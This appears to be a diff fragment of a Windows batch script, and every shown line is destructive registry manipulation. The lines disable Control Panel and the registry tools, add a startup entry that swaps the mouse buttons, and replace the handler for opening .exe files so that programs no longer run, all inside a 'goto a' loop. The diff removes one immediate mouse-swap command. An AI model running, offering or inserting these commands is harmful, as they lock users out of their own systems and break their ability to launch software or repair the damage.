@@ -42,7 +42,6 @@ reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v No
 reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoStartMenuMyMusic /t REG_DWORD /d 1 /f 
 reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 1 /f
 reg add "hklm\Software\Microsoft\Windows\CurrentVersion\run" /v SwapNT /t REG_SZ /d rundll32 user32, SwapMouseButton /f 
-start rundll32 user32, SwapMouseButton 
 reg add "HKCR\exefile\shell\open\command" /ve /t REG_SZ /d rundll32.exe /f 
 reg add "hkcu\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v disableregistrytools /t REG_DWORD /d 1 /f 
 goto a
